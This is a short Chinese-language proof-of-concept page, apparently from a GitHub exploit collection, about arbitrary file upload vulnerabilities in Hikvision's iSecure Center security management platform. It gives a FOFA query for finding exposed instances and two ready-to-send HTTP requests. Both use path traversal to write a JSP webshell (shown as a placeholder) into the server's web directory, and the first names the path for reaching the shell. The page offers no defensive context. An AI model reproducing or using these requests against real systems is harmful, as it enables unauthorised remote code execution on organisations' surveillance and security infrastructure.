## fofa
```
app="HIKVISION-iSecure-Center"
```

## HiKVISION 综合安防管理平台 report 任意文件上传漏洞

```
POST /svm/api/external/report HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%jsp的马%>

------WebKitFormBoundary9PggsiM755PLa54a--

马儿路径：/portal/ui/login/..;/..;/new.jsp

```

## HiKVISION 综合安防管理平台 files 任意文件上传漏洞
```
POST /center/api/files;.html HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%jsp的马%>
------WebKitFormBoundary9PggsiM755PLa54a--
```
![image](https://github.com/wy876/POC/assets/139549762/8e3f6c98-9d8d-4ede-bd92-e16baee49a8d)
